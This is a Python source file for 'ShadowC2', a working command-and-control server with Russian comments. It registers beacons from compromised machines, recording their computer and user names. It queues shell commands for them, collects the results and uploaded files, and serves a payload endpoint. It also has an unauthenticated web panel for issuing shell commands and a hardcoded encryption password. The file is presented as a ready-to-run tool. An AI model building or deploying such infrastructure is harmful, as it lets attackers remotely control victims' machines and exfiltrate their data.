#!/usr/bin/env python3
"""
ShadowC2 Server - Advanced Command & Control Server
Author: Security Research Team
Version: 1.0
"""

import asyncio
import json
import sqlite3
import hashlib
import base64
import argparse
import logging
import ssl
import time
import random
import string
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, asdict
from aiohttp import web, ClientSession
from aiohttp.web_request import Request
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import os

# Конфигурация сервера
@dataclass
class ServerConfig:
    host: str = "0.0.0.0"
    port: int = 8443
    ssl_cert: str = "server.crt"
    ssl_key: str = "server.key"
    db_file: str = "shadowc2.db"
    log_file: str = "shadowc2.log"
    debug: bool = False
    max_beacons: int = 1000
    beacon_timeout: int = 300

# Модели данных
@dataclass
class Beacon:
    id: str
    computer_name: str
    user_name: str
    ip_address: str
    first_seen: datetime
    last_seen: datetime
    status: str
    system_info: Dict[str, Any]
    sleep_time: int = 30
    jitter: int = 25

@dataclass
class Command:
    id: str
    beacon_id: str
    command_type: str
    command_data: Dict[str, Any]
    status: str
    created_at: datetime
    executed_at: Optional[datetime]
    result: Optional[str]

class ShadowC2Database:
    """Класс для работы с базой данных"""
    
    def __init__(self, db_file: str):
        self.db_file = db_file
        self.init_database()
    
    def init_database(self):
        """Инициализация базы данных"""
        with sqlite3.connect(self.db_file) as conn:
            conn.execute('''
                CREATE TABLE IF NOT EXISTS beacons (
                    id TEXT PRIMARY KEY,
                    computer_name TEXT NOT NULL,
                    user_name TEXT NOT NULL,
                    ip_address TEXT NOT NULL,
                    first_seen TIMESTAMP NOT NULL,
                    last_seen TIMESTAMP NOT NULL,
                    status TEXT NOT NULL,
                    system_info TEXT,
                    sleep_time INTEGER DEFAULT 30,
                    jitter INTEGER DEFAULT 25
                )
            ''')
            
            conn.execute('''
                CREATE TABLE IF NOT EXISTS commands (
                    id TEXT PRIMARY KEY,
                    beacon_id TEXT NOT NULL,
                    command_type TEXT NOT NULL,
                    command_data TEXT NOT NULL,
                    status TEXT NOT NULL,
                    created_at TIMESTAMP NOT NULL,
                    executed_at TIMESTAMP,
                    result TEXT,
                    FOREIGN KEY (beacon_id) REFERENCES beacons (id)
                )
            ''')
    
    def add_beacon(self, beacon: Beacon) -> bool:
        """Добавление нового beacon"""
        try:
            with sqlite3.connect(self.db_file) as conn:
                conn.execute('''
                    INSERT OR REPLACE INTO beacons 
                    (id, computer_name, user_name, ip_address, first_seen, last_seen, status, system_info, sleep_time, jitter)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    beacon.id,
                    beacon.computer_name,
                    beacon.user_name,
                    beacon.ip_address,
                    beacon.first_seen.isoformat(),
                    beacon.last_seen.isoformat(),
                    beacon.status,
                    json.dumps(beacon.system_info) if beacon.system_info else None,
                    beacon.sleep_time,
                    beacon.jitter
                ))
            return True
        except Exception as e:
            logging.error(f"Database error adding beacon: {e}")
            return False
    
    def update_beacon_status(self, beacon_id: str, status: str) -> bool:
        """Обновление статуса beacon"""
        try:
            with sqlite3.connect(self.db_file) as conn:
                conn.execute('''
                    UPDATE beacons 
                    SET status = ?, last_seen = ? 
                    WHERE id = ?
                ''', (status, datetime.now().isoformat(), beacon_id))
            return True
        except Exception as e:
            logging.error(f"Database error updating beacon: {e}")
            return False
    
    def get_beacons(self) -> List[Beacon]:
        """Получение всех beacon"""
        beacons = []
        try:
            with sqlite3.connect(self.db_file) as conn:
                cursor = conn.execute('SELECT * FROM beacons')
                for row in cursor.fetchall():
                    beacon = Beacon(
                        id=row[0],
                        computer_name=row[1],
                        user_name=row[2],
                        ip_address=row[3],
                        first_seen=datetime.fromisoformat(row[4]),
                        last_seen=datetime.fromisoformat(row[5]),
                        status=row[6],
                        system_info=json.loads(row[7]) if row[7] else {},
                        sleep_time=row[8],
                        jitter=row[9]
                    )
                    beacons.append(beacon)
        except Exception as e:
            logging.error(f"Database error getting beacons: {e}")
        
        return beacons
    
    def add_command(self, command: Command) -> bool:
        """Добавление новой команды"""
        try:
            with sqlite3.connect(self.db_file) as conn:
                conn.execute('''
                    INSERT INTO commands 
                    (id, beacon_id, command_type, command_data, status, created_at, executed_at, result)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    command.id,
                    command.beacon_id,
                    command.command_type,
                    json.dumps(command.command_data),
                    command.status,
                    command.created_at.isoformat(),
                    command.executed_at.isoformat() if command.executed_at else None,
                    command.result
                ))
            return True
        except Exception as e:
            logging.error(f"Database error adding command: {e}")
            return False
    
    def get_pending_commands(self, beacon_id: str) -> List[Command]:
        """Получение ожидающих команд для beacon"""
        commands = []
        try:
            with sqlite3.connect(self.db_file) as conn:
                cursor = conn.execute('''
                    SELECT * FROM commands 
                    WHERE beacon_id = ? AND status = 'pending'
                    ORDER BY created_at ASC
                ''', (beacon_id,))
                
                for row in cursor.fetchall():
                    command = Command(
                        id=row[0],
                        beacon_id=row[1],
                        command_type=row[2],
                        command_data=json.loads(row[3]),
                        status=row[4],
                        created_at=datetime.fromisoformat(row[5]),
                        executed_at=datetime.fromisoformat(row[6]) if row[6] else None,
                        result=row[7]
                    )
                    commands.append(command)
        except Exception as e:
            logging.error(f"Database error getting pending commands: {e}")
        
        return commands
    
    def update_command_result(self, command_id: str, result: str) -> bool:
        """Обновление результата команды"""
        try:
            with sqlite3.connect(self.db_file) as conn:
                conn.execute('''
                    UPDATE commands 
                    SET status = 'completed', executed_at = ?, result = ? 
                    WHERE id = ?
                ''', (datetime.now().isoformat(), result, command_id))
            return True
        except Exception as e:
            logging.error(f"Database error updating command result: {e}")
            return False

class ShadowC2Server:
    """Основной класс C2 сервера"""
    
    def __init__(self, config: ServerConfig):
        self.config = config
        self.db = ShadowC2Database(config.db_file)
        self.beacons: Dict[str, Beacon] = {}
        self.commands: Dict[str, List[Command]] = {}
        self.encryption_key = self._generate_encryption_key()
        
        # Настройка логирования
        logging.basicConfig(
            level=logging.DEBUG if config.debug else logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(config.log_file),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger('ShadowC2')
    
    def _generate_encryption_key(self) -> bytes:
        """Генерация ключа шифрования"""
        password = b"ShadowC2_Secret_Key_2024"
        salt = b'stable_salt'
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password))
        return key
    
    def _encrypt_data(self, data: str) -> str:
        """Шифрование данных"""
        f = Fernet(self.encryption_key)
        encrypted = f.encrypt(data.encode())
        return base64.b64encode(encrypted).decode()
    
    def _decrypt_data(self, encrypted_data: str) -> str:
        """Дешифрование данных"""
        try:
            f = Fernet(self.encryption_key)
            encrypted = base64.b64decode(encrypted_data.encode())
            decrypted = f.decrypt(encrypted)
            return decrypted.decode()
        except Exception as e:
            self.logger.error(f"Decryption error: {e}")
            return ""
    
    def _generate_beacon_id(self) -> str:
        """Генерация уникального ID для beacon"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    
    def _generate_command_id(self) -> str:
        """Генерация уникального ID для команды"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    
    async def handle_beacon(self, request: Request) -> web.Response:
        """Обработка beacon запросов"""
        try:
            data = await request.json()
            
            # Получаем IP адрес клиента
            client_ip = request.remote
            
            # Получаем заголовки с информацией о системе
            computer_name = request.headers.get('X-Computer', 'Unknown')
            user_name = request.headers.get('X-User', 'Unknown')
            
            # Генерируем или получаем beacon ID
            beacon_id = request.headers.get('X-Beacon-ID', self._generate_beacon_id())
            
            # Создаем или обновляем beacon
            if beacon_id not in self.beacons:
                beacon = Beacon(
                    id=beacon_id,
                    computer_name=computer_name,
                    user_name=user_name,
                    ip_address=client_ip,
                    first_seen=datetime.now(),
                    last_seen=datetime.now(),
                    status='active',
                    system_info=data
                )
                self.beacons[beacon_id] = beacon
                self.db.add_beacon(beacon)
                self.logger.info(f"New beacon registered: {beacon_id} ({computer_name}\\{user_name})")
            else:
                # Обновляем существующий beacon
                self.beacons[beacon_id].last_seen = datetime.now()
                self.beacons[beacon_id].system_info = data
                self.db.update_beacon_status(beacon_id, 'active')
            
            # Отправляем ожидающие команды
            pending_commands = self.db.get_pending_commands(beacon_id)
            
            if pending_commands:
                # Отправляем первую команду
                command = pending_commands[0]
                response_data = {
                    'command_id': command.id,
                    'command_type': command.command_type,
                    'command_data': command.command_data
                }
                
                self.logger.info(f"Sending command {command.id} to beacon {beacon_id}")
            else:
                # Нет команд - отправляем пустой ответ
                response_data = {
                    'command_id': None,
                    'command_type': 'sleep',
                    'command_data': {'duration': 30}
                }
            
            return web.json_response(response_data)
            
        except Exception as e:
            self.logger.error(f"Error handling beacon: {e}")
            return web.json_response({'error': 'Internal server error'}, status=500)
    
    async def handle_command_result(self, request: Request) -> web.Response:
        """Обработка результатов команд"""
        try:
            command_id = request.query.get('id')
            if not command_id:
                return web.json_response({'error': 'Command ID required'}, status=400)
            
            data = await request.json()
            result = data.get('result', '')
            
            # Обновляем результат команды в базе данных
            self.db.update_command_result(command_id, result)
            
            self.logger.info(f"Command {command_id} completed with result: {result[:100]}...")
            
            return web.json_response({'status': 'success'})
            
        except Exception as e:
            self.logger.error(f"Error handling command result: {e}")
            return web.json_response({'error': 'Internal server error'}, status=500)
    
    async def handle_payload(self, request: Request) -> web.Response:
        """Обработка запросов пейлоада"""
        try:
            # В реальном сценарии здесь должен быть динамический пейлоад
            # Для примера возвращаем простой ответ
            payload_data = b"ShadowC2 Beacon Payload"
            
            return web.Response(
                body=payload_data,
                headers={'Content-Type': 'application/octet-stream'}
            )
            
        except Exception as e:
            self.logger.error(f"Error handling payload request: {e}")
            return web.json_response({'error': 'Internal server error'}, status=500)
    
    async def handle_upload(self, request: Request) -> web.Response:
        """Обработка загрузки файлов"""
        try:
            reader = await request.multipart()
            
            # Создаем директорию для загрузок
            upload_dir = Path("uploads")
            upload_dir.mkdir(exist_ok=True)
            
            async for part in reader:
                if part.filename:
                    filename = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}_{part.filename}"
                    filepath = upload_dir / filename
                    
                    with open(filepath, 'wb') as f:
                        while True:
                            chunk = await part.read_chunk()
                            if not chunk:
                                break
                            f.write(chunk)
                    
                    self.logger.info(f"File uploaded: {filepath}")
            
            return web.json_response({'status': 'success', 'message': 'File uploaded successfully'})
            
        except Exception as e:
            self.logger.error(f"Error handling upload: {e}")
            return web.json_response({'error': 'Internal server error'}, status=500)
    
    async def handle_api(self, request: Request) -> web.Response:
        """API endpoint для управления C2"""
        try:
            action = request.match_info.get('action')
            
            if action == 'beacons':
                # Возвращаем список всех beacon
                beacons_data = []
                for beacon in self.beacons.values():
                    beacons_data.append(asdict(beacon))
                
                return web.json_response({'beacons': beacons_data})
            
            elif action == 'commands':
                beacon_id = request.query.get('beacon_id')
                if request.method == 'POST':
                    # Создание новой команды
                    data = await request.json()
                    command_type = data.get('type')
                    command_data = data.get('data', {})
                    
                    if not beacon_id or not command_type:
                        return web.json_response({'error': 'Beacon ID and command type required'}, status=400)
                    
                    command = Command(
                        id=self._generate_command_id(),
                        beacon_id=beacon_id,
                        command_type=command_type,
                        command_data=command_data,
                        status='pending',
                        created_at=datetime.now(),
                        executed_at=None,
                        result=None
                    )
                    
                    self.db.add_command(command)
                    
                    self.logger.info(f"New command created: {command.id} for beacon {beacon_id}")
                    
                    return web.json_response({'command_id': command.id})
                
                else:
                    # Получение команд для beacon
                    if not beacon_id:
                        return web.json_response({'error': 'Beacon ID required'}, status=400)
                    
                    commands = self.db.get_pending_commands(beacon_id)
                    commands_data = [asdict(cmd) for cmd in commands]
                    
                    return web.json_response({'commands': commands_data})
            
            else:
                return web.json_response({'error': 'Unknown action'}, status=404)
                
        except Exception as e:
            self.logger.error(f"Error handling API request: {e}")
            return web.json_response({'error': 'Internal server error'}, status=500)
    
    def setup_routes(self, app: web.Application):
        """Настройка маршрутов"""
        # Маршруты для beacon
        app.router.add_post('/beacon', self.handle_beacon)
        app.router.add_post('/result', self.handle_command_result)
        app.router.add_get('/payload.bin', self.handle_payload)
        app.router.add_post('/upload', self.handle_upload)
        
        # API маршруты
        app.router.add_get('/api/{action}', self.handle_api)
        app.router.add_post('/api/{action}', self.handle_api)
        
        # Статические файлы для веб-интерфейса
        app.router.add_static('/static', 'static')
        app.router.add_get('/', self.handle_index)
    
    async def handle_index(self, request: Request) -> web.Response:
        """Главная страница веб-интерфейса"""
        html_content = """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>ShadowC2 Control Panel</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background-color: #1a1a1a; color: #ffffff; }
                .container { max-width: 1200px; margin: 0 auto; }
                .header { text-align: center; margin-bottom: 30px; }
                .beacon-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
                .beacon-card { background: #2a2a2a; border: 1px solid #444; border-radius: 8px; padding: 15px; }
                .beacon-id { color: #4a90e2; font-weight: bold; }
                .status-online { color: #27ae60; }
                .status-offline { color: #e74c3c; }
                .command-form { margin-top: 10px; }
                .command-input { width: 100%; padding: 5px; margin: 5px 0; background: #333; color: #fff; border: 1px solid #555; }
                .btn { padding: 8px 16px; background: #4a90e2; color: white; border: none; border-radius: 4px; cursor: pointer; }
                .btn:hover { background: #357abd; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>ShadowC2 Control Panel</h1>
                    <p>Advanced Command & Control Server</p>
                </div>
                
                <div id="beacons-container">
                    <h2>Active Beacons</h2>
                    <div class="beacon-grid" id="beacon-grid">
                        <!-- Beacon cards will be loaded here -->
                    </div>
                </div>
                
                <div id="commands-container">
                    <h2>Command History</h2>
                    <div id="commands-list">
                        <!-- Commands will be loaded here -->
                    </div>
                </div>
            </div>
            
            <script>
                async function loadBeacons() {
                    try {
                        const response = await fetch('/api/beacons');
                        const data = await response.json();
                        
                        const grid = document.getElementById('beacon-grid');
                        grid.innerHTML = '';
                        
                        data.beacons.forEach(beacon => {
                            const card = document.createElement('div');
                            card.className = 'beacon-card';
                            card.innerHTML = `
                                <div class="beacon-id">${beacon.id}</div>
                                <div>Computer: ${beacon.computer_name}</div>
                                <div>User: ${beacon.user_name}</div>
                                <div>IP: ${beacon.ip_address}</div>
                                <div>Status: <span class="status-${beacon.status}">${beacon.status}</span></div>
                                <div>Last Seen: ${new Date(beacon.last_seen).toLocaleString()}</div>
                                <form class="command-form" onsubmit="sendCommand(event, '${beacon.id}')">
                                    <input type="text" class="command-input" placeholder="Enter command" name="command">
                                    <button type="submit" class="btn">Send Command</button>
                                </form>
                            `;
                            grid.appendChild(card);
                        });
                    } catch (error) {
                        console.error('Error loading beacons:', error);
                    }
                }
                
                async function sendCommand(event, beaconId) {
                    event.preventDefault();
                    const command = event.target.command.value;
                    
                    try {
                        const response = await fetch('/api/commands?beacon_id=' + beaconId, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                type: 'shell',
                                data: { command: command }
                            })
                        });
                        
                        const result = await response.json();
                        if (result.command_id) {
                            alert('Command sent successfully! ID: ' + result.command_id);
                            event.target.command.value = '';
                        }
                    } catch (error) {
                        console.error('Error sending command:', error);
                        alert('Error sending command');
                    }
                }
                
                // Load beacons on page load
                loadBeacons();
                
                // Refresh beacons every 10 seconds
                setInterval(loadBeacons, 10000);
            </script>
        </body>
        </html>
        """
        return web.Response(text=html_content, content_type='text/html')
    
    async def start(self):
        """Запуск сервера"""
        app = web.Application()
        self.setup_routes(app)
        
        # SSL контекст
        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ssl_context.load_cert_chain(self.config.ssl_cert, self.config.ssl_key)
        
        self.logger.info(f"Starting ShadowC2 server on {self.config.host}:{self.config.port}")
        
        runner = web.AppRunner(app)
        await runner.setup()
        
        site = web.TCPSite(runner, self.config.host, self.config.port, ssl_context=ssl_context)
        await site.start()
        
        # Бесконечный цикл
        try:
            while True:
                await asyncio.sleep(3600)
        except KeyboardInterrupt:
            self.logger.info("Shutting down ShadowC2 server...")
        finally:
            await runner.cleanup()

def main():
    parser = argparse.ArgumentParser(description='ShadowC2 Server')
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind to')
    parser.add_argument('--port', type=int, default=8443, help='Port to bind to')
    parser.add_argument('--ssl-cert', default='server.crt', help='SSL certificate file')
    parser.add_argument('--ssl-key', default='server.key', help='SSL key file')
    parser.add_argument('--debug', action='store_true', help='Enable debug mode')
    
    args = parser.parse_args()
    
    config = ServerConfig(
        host=args.host,
        port=args.port,
        ssl_cert=args.ssl_cert,
        ssl_key=args.ssl_key,
        debug=args.debug
    )
    
    server = ShadowC2Server(config)
    
    try:
        asyncio.run(server.start())
    except KeyboardInterrupt:
        print("\nShadowC2 server stopped.")

if __name__ == '__main__':
    main()